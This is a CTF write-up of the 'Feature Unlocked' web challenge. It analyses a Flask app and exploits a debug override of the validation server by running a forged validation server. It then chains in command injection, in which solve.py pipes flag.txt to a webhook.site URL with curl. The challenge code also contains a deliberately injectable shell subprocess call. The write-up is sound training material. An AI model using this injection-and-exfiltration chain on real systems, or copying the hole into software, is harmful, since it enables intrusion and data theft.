---
title: "CyberSpace24 - Feature Unlocked"
date: 2024-09-02T10:28:44+01:00
tags: ["ctf", "write-up", "cyberspace"]
author: "hxuu"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "CTF write-up for Feature Unlocked"
summary: "In this CTF challenge, we exploited a web app's validation mechanism by setting a custom validation server with debug mode enabled. This allowed us to bypass feature access controls and perform Remote Code Execution (RCE) to retrieve the flag."
canonicalURL: ""
disableHLJS: false
disableShare: false
hideSummary: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
editPost:
    URL: "https://github.com/hxuu/content"
    Text: "Suggest Changes"
    appendFilePath: true
---

## Challenge Description

```
name: feature unlocked
category: web exploitation
points: 50
solves: 184
```

The world's coolest app has a brand new feature! Too bad it's not released until after the CTF..

> Note: Note: The challenge deployment will automatically restart every 15 minutes.


## Analysis

We're given the following web page:


![initial](/blog/images/2024-09-02-10-32-42.png)

It seems that we have to unlock the new feature which is only available after the CTF ends:


![feature-initial](/blog/images/2024-09-02-10-33-19.png)

We obviously can't wait until the CTF ends, luckily for us, we're given the source code
for the application [here](https://2024.csc.tf/files/2fcb84a23fe1a4a6453f4345951a062c/handout_featur_eunlocked.zip?token=eyJ1c2VyX2lkIjo4MDEsInRlYW1faWQiOjQwMCwiZmlsZV9pZCI6NTJ9.ZtWnVA.Go_XGd7hv5RMCLcG43jU7YpMRNU)

```bash
.
├── Dockerfile
├── flag.txt
├── nsjail.cfg
└── src
    ├── app
    │   ├── __init__.py
    │   ├── main.py
    │   ├── static
    │   │   ├── css
    │   │   │   ├── animations.css
    │   │   │   └── styles.css
    │   │   └── images
    │   │       └── logo.png
    │   └── templates
    │       ├── base.html
    │       ├── feature.html
    │       ├── index.html
    │       └── release.html
    ├── requirements.txt
    ├── run.sh
    └── validation_server
        └── validation.py
```

Looking at the Dockerfile gives:

```Dockerfile
FROM python:3.10-slim as chroot

ENV PYTHONUNBUFFERED=1

RUN apt-get update && apt-get install -y curl && apt-get clean

# create a /home/user and cd into it
RUN mkdir -p /home/user
WORKDIR /home/user

# copy flag and src/ to /home/user
COPY src/ flag.txt ./
RUN pip install --no-cache-dir -r requirements.txt

FROM gcr.io/kctf-docker/challenge@sha256:0f7d757bcda470c3bbc063606335b915e03795d72ba1d8fdb6f0f9ff3757364f

COPY --from=chroot / /chroot

COPY nsjail.cfg /home/user/

CMD kctf_setup && \
    kctf_drop_privs nsjail --config /home/user/nsjail.cfg -- /home/user/run.sh
```

This Dockerfile builds a secure CTF challenge environment:

1. **Build Stage**: Prepares the application by setting up Python, installing dependencies, and copying necessary files.
2. **Final Stage**: Uses a secure base image, copies the prepared environment, and runs the challenge inside a restricted sandbox (`nsjail`).

Let's check the application now.

### `main.py`

```python
import subprocess
import base64
import json
import time
import requests
import os
from flask import Flask, request, render_template, make_response, redirect, url_for
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS
from itsdangerous import URLSafeTimedSerializer

app = Flask(__name__)
app.secret_key = os.urandom(16)
serializer = URLSafeTimedSerializer(app.secret_key)

DEFAULT_VALIDATION_SERVER = 'http://127.0.0.1:1338'
NEW_FEATURE_RELEASE = int(time.time()) + 7 * 24 * 60 * 60
DEFAULT_PREFERENCES = base64.b64encode(json.dumps({
    'theme': 'light',
    'language': 'en'
}).encode()).decode()


def get_preferences():
    preferences = request.cookies.get('preferences')
    if not preferences:
        response = make_response(render_template(
            'index.html', new_feature=False))
        response.set_cookie('preferences', DEFAULT_PREFERENCES)
        return json.loads(base64.b64decode(DEFAULT_PREFERENCES)), response
    return json.loads(base64.b64decode(preferences)), None


@app.route('/')
def index():
    _, response = get_preferences()
    return response if response else render_template('index.html', new_feature=False)


@app.route('/release')
def release():
    # we have to get a cookie named access_token
    token = request.cookies.get('access_token')
    if token:
        try:
            # when the token is loaded (from key that we don't know), it should equal access_granted
            data = serializer.loads(token)
            if data == 'access_granted':
                return redirect(url_for('feature'))
        except Exception as e:
            print(f"Token validation error: {e}")

    # have to go here
    validation_server = DEFAULT_VALIDATION_SERVER
    if request.args.get('debug') == 'true':
        preferences, _ = get_preferences()
        validation_server = preferences.get(
            'validation_server', DEFAULT_VALIDATION_SERVER)

    if validate_server(validation_server):
        response = make_response(render_template(
            'release.html', feature_unlocked=True))
        # token has our desired access_granted dumped
        token = serializer.dumps('access_granted')
        response.set_cookie('access_token', token, httponly=True, secure=True)
        # feature unlocked
        return response

    return render_template('release.html', feature_unlocked=False, release_timestamp=NEW_FEATURE_RELEASE)


@app.route('/feature', methods=['GET', 'POST'])
def feature():
    token = request.cookies.get('access_token')
    if not token:
        return redirect(url_for('index'))

    try:
        data = serializer.loads(token)
        if data != 'access_granted':
            return redirect(url_for('index'))

        if request.method == 'POST':
            # get the text from body
            to_process = request.form.get('text')
            try:
                # RCE here
                word_count = f"echo {to_process} | wc -w"
                output = subprocess.check_output(
                    word_count, shell=True, text=True)
            except subprocess.CalledProcessError as e:
                output = f"Error: {e}"
            return render_template('feature.html', output=output)

        return render_template('feature.html')
    except Exception as e:
        print(f"Error: {e}")
        return redirect(url_for('index'))


def get_pubkey(validation_server):
    try:
        response = requests.get(f"{validation_server}/pubkey")
        response.raise_for_status()
        return ECC.import_key(response.text)
    except requests.RequestException as e:
        raise Exception(
            f"Error connecting to validation server for public key: {e}")


def validate_access(validation_server):
    pubkey = get_pubkey(validation_server)
    try:
        response = requests.get(validation_server)
        response.raise_for_status()
        data = response.json()
        date = data['date'].encode('utf-8')
        signature = bytes.fromhex(data['signature'])
        verifier = DSS.new(pubkey, 'fips-186-3')
        verifier.verify(SHA256.new(date), signature)
        return int(date)
    except requests.RequestException as e:
        raise Exception(f"Error validating access: {e}")


def validate_server(validation_server):
    try:
        date = validate_access(validation_server)
        return date >= NEW_FEATURE_RELEASE
    except Exception as e:
        print(f"Error: {e}")
    return False


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

This Flask application manages feature access using a cookie-based token system. Users accessing the `/release` route may receive an access token if they are validated by a server. If the server's public key verifies a valid date, the feature is unlocked, and the token is set. The `/feature` route allows text processing with potential **Remote Code Execution (RCE)** via a subprocess command. It also fetches a public key and verifies server access using digital signatures. The application defaults to a basic theme and language in user preferences, which can be updated based on cookies.

Interesting, the server uses the validation server hosted on `localhost` port `1338`
to validate the access. Let's check how this latter is implemented:

### `validation.py`

```python
from flask import Flask, jsonify
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

app = Flask(__name__)

key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')


@app.route('/pubkey', methods=['GET'])
def get_pubkey():
    return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'}


@app.route('/', methods=['GET'])
def index():
    date = str(int(time.time()))
    h = SHA256.new(date.encode('utf-8'))
    signature = DSS.new(key, 'fips-186-3').sign(h)

    return jsonify({
        'date': date,
        'signature': signature.hex()
    })


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=1338)
```

In simple terms, this validation server helps the main application check if it should unlock features. It does this by providing a way to verify if a timestamp given by the server is genuine. When the main application asks the server, it gets a timestamp and a special code showing it’s real. The main application then uses this code to confirm that the server's timestamp is valid before unlocking any features.

In more technical terms, the validation server returns a date which is later compared
to the NEW\_FEATURE\_RELEASE date, if the date given by the validation server is greater than
the latter, the feature is unlocked (access\_granted set, by extension we get RCE)

```python
# validate server function
date = validate_access(validation_server)
return date >= NEW_FEATURE_RELEASE
```

However, the server used by the application currently doesn't serve us well. Only if we could redirect the application onto a server of our own...

---

It turns out, when the `debug` query parameter is set to `true` in the `/release` route, the application allows overriding the default validation server with one specified in the user's cookie preferences. If the custom server is validated successfully, it may issue an access token granting feature access. This setup could potentially be exploited if the custom validation server is not securely configured.

This is exactly what we want, we can host our own server which instead of returning
the current date, it returns a date greater that NEW\_FEATURE\_RELEASE. After that,
we can send a POST request to `/feature` with text equal to our payload which retrieves
the flag.txt file.


## Exploitation

Let's first write our own `custom-validation.py` server, host it and tunnel our localhost using `beeceptor`

### `custom-validation.py`

```python
from flask import Flask, jsonify, request
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

app = Flask(__name__)

# Generate a key and public key
key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')

# Constants
DEFAULT_VALIDATION_SERVER = 'http://127.0.0.1:1338'

@app.route('/pubkey', methods=['GET'])
def get_pubkey():
    return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route('/', methods=['GET'])
def index():
    date = str(int(time.time()))
    h = SHA256.new(date.encode('utf-8'))
    signature = DSS.new(key, 'fips-186-3').sign(h)

    # Bypass validation by always returning a valid date and signature
    # Ensure the date is in the future to always pass the validation
    valid_date = str(int(time.time()) + 10 * 24 * 60 * 60)  # Valid for 10 days in the future
    valid_signature = DSS.new(key, 'fips-186-3').sign(SHA256.new(valid_date.encode('utf-8')))

    return jsonify({
        'date': valid_date,
        'signature': valid_signature.hex()
    })

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=1338)
```

This here always returns a valid date. Let's now create our `gen.py` script to get the acess\_granted cookie.

### `gen.py`

```python
import requests
import base64
import json
import time

# Configuration
BASE_URL = 'https://feature-unlocked-web.challs.csc.tf'
RELEASE_ENDPOINT = '/release'
PREFERENCES_COOKIE_NAME = 'preferences'
DEFAULT_PREFERENCES = {
    'theme': 'light',
    'language': 'en',
    'validation_server': 'https://<id>.free.beeceptor.com'  # This should match the modified validation server URL
}

# Encode preferences as base64
encoded_preferences = base64.b64encode(
    json.dumps(DEFAULT_PREFERENCES).encode()
).decode()

# Set the preferences cookie value
cookies = {
    PREFERENCES_COOKIE_NAME: encoded_preferences
}

# Make the GET request to /release with debug=true
response = requests.get(
    f'{BASE_URL}{RELEASE_ENDPOINT}',
    params={'debug': 'true'},
    cookies=cookies,
    allow_redirects=False  # Avoid following redirects to see the response directly
)

# Print the response
print(f"Status Code: {response.status_code}")
print(f"Response Headers: {response.headers}")
print(f"Response Text: {response.text}")

# If the response includes a 'Set-Cookie' header, print it to check the access_token
if 'Set-Cookie' in response.headers:
    print(f"Set-Cookie Header: {response.headers['Set-Cookie']}")
```

Running `python gen.py` should give us the token

![get-token](/blog/images/2024-09-02-11-03-04.png)

And it did! Let's now craft another script `solve.py` to retrieve the `flag.txt`

### `solve.py`

```python
import requests

# Replace these values with your actual values
access_token = 'ImFjY2Vzc19ncmFudGVkIg.ZtWNIQ.efPFQEBT8jNFoIlWVhjSeYC2Iuk'
feature_url = 'https://feature-unlocked-web.challs.csc.tf/feature'

# Text to be sent to the /feature endpoint for word count testing
text_body = 'This; cat flag.txt | curl -X POST -d @- https://webhook.site/ea19e1c2-91bb-469b-bfd4-8f3608541e56'

# Create the headers with the access token
headers = {
    'Cookie': f'access_token={access_token}'
}

# Create the payload with the text to be processed
data = {
    'text': text_body
}

# Make the POST request to the /feature endpoint
response = requests.post(feature_url, headers=headers, data=data)

# Print the response from the server
print(f"Status Code: {response.status_code}")
print("Response Content:")
print(response.text)
```

Running `python solve.py` should send a request to our webhook, and we should see the flag there.


![flag](/blog/images/2024-09-02-11-06-34.png)

There we go~ flag is: `CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}`

---

From this challenge, we learned the importance of:

1. **Understanding Validation Mechanisms**: Knowing how to manipulate and bypass validation checks can help in exploiting such features.
2. **Using Debug Parameters**: Identifying how debug modes or parameters can be leveraged to control or redirect application behavior.
3. **Remote Code Execution (RCE)**: Recognizing and exploiting RCE vulnerabilities, especially in contexts where subprocess commands are involved.
4. **Custom Validation Servers**: Realizing the risks of trusting external or custom validation servers without proper security checks.


